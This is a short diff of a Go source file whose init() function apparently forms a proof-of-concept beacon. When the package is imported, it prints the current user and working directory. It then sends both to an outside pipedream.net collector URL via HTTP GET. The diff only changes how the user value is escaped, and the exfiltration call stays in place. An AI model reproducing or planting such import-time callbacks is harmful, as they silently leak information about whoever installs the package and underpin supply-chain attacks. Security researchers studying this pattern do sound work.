@@ -13,5 +13,5 @@ func init() {
 	fmt.Printf("[PoC] USER=%s\n", user)
 	fmt.Printf("[PoC] CWD=%s\n", dir)
 
-	http.Get("https://eou39l9f2i96s48.m.pipedream.net/poc?user=" + user + "&dir=" + url.QueryEscape(dir))
+	http.Get("https://eou39l9f2i96s48.m.pipedream.net/poc?user=" + url.QueryEscape(user) + "&dir=" + url.QueryEscape(dir))
 }
